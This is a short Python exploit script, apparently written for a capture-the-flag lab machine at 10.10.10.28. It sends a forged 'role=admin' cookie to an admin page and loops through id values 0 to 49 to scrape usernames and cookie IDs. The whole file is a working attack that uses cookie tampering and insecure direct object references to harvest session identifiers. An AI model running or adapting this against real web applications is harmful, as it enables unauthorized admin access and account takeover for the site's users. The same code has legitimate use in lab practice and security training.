#!/usr/bin/python3
#coding=utf-8


# PHP ID Parameter Scraper
# Author: Gaizka Martin (a.k.a g2jz)


import requests
import re
import time

from pwn import *

def makeRequests():
    s = requests.Session()
    log.progress("Empezando escaneo\n")

    headers = {
        'cookie' : 'user=34322; role=admin'
    }

    for i in range(50):
        url = "http://10.10.10.28/cdn-cgi/login/admin.php?content=accounts&id=%s" % i    
        
        data = {
            'content': 'accounts',
            'id': i
        }
        
        r = s.get(url,headers=headers,data=data)
        
        username = re.findall(r'</td><td>(.*?)</td><td>',r.text)[0]
        cookieId = re.findall(r'<tr><td>(.*?)</td><td>',r.text)[0]

        if username != '' and cookieId != '':
            print("[+] User: %11s    UrlId: %.2d    CookieId: %.7s" % (username,i,cookieId))
    
    log.success("Escaneo completado")

if __name__ == "__main__":
    try:
        makeRequests()
    except:
        log.failure("Ha ocurrido un error")
